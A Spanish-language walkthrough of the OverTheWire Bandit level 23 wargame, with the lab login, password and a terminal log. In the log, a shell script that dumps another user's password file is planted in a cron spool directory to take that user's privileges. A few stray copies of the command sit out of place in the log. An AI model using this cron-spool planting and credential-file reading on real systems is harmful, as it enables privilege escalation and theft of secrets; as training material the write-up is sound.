### Objetivo
Un programa se ejecuta automáticamente a intervalos regulares desde cron, el programador de trabajos basado en el tiempo. Busque en /etc/cron.d/ la configuración y vea qué comando se está ejecutando.

NOTA: Este nivel requiere que cree su propio primer script de shell. ¡Este es un gran paso y deberías estar orgulloso de ti mismo cuando superes este nivel!

NOTA 2: Tenga en cuenta que su script de shell se elimina una vez ejecutado, por lo que es posible que desee conservar una copia...
### Datos de acceso
- Puerto: 2220
- Dirección: bandit.labs.overthewire.org
- Contraseña: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
- Usuario: bandit23
### Solución

```bash
bandit23@bandit:/tmp$ mkdir tmpmisdf

cat /etc/bandit_pass/bandit24 >
bandit23@bandit:/tmp$ cd tmpmisdf
bandit23@bandit:/tmp/tmpmisdf$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

cat /etc/bandit_pass/bandit24 > /tmp/tmpmisdf/key.txt
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/tmp/tmpmisdf$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/tmp/tmpmisdf$ vim
bandit23@bandit:/tmp/tmpmisdf$ vim password.sh
bandit23@bandit:/tmp/tmpmisdf$ cat /etc/bandit_pass/bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
bandit23@bandit:/tmp/tmpmisdf$ vim password.sh
bandit23@bandit:/tmp/tmpmisdf$ pwd
/tmp/tmpmisdf
bandit23@bandit:/tmp/tmpmisdf$ vim password.sh
bandit23@bandit:/tmp/tmpmisdf$ cat password.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmpmisdf/key.txt
bandit23@bandit:/tmp/tmpmisdf$ chmod +rx password.sh
bandit23@bandit:/tmp/tmpmisdf$ cp password.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmpmisdf$ ls
password.sh
bandit23@bandit:/tmp/tmpmisdf$ chmod +rwx /tmp/tmpmisdf
bandit23@bandit:/tmp/tmpmisdf$ ls
password.sh
bandit23@bandit:/tmp/tmpmisdf$ ls
password.sh
bandit23@bandit:/tmp/tmpmisdf$ ls
password.sh
bandit23@bandit:/tmp/tmpmisdf$ ls
password.sh
bandit23@bandit:/tmp/tmpmisdf$ ls
password.sh
bandit23@bandit:/tmp/tmpmisdf$ touch key.txt
bandit23@bandit:/tmp/tmpmisdf$ chmod 777 key.txt
bandit23@bandit:/tmp/tmpmisdf$ ls
key.txt  password.sh
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 22 21:36 .
drwxrwx-wt 277 root     root     405504 Feb 22 21:37 ..
-rwxrwxrwx   1 bandit23 bandit23      0 Feb 22 21:36 key.txt
-rwxrwxr-x   1 bandit23 bandit23     54 Feb 22 21:31 password.sh
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ ls /var/spool/bandit24/foo
ls: cannot open directory '/var/spool/bandit24/foo': Permission denied
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
bandit23@bandit:/tmp/tmpmisdf$ cp password.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmpmisdf$ cat key.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/tmpmisdf$
```

### Notas adicionales


### Referencias
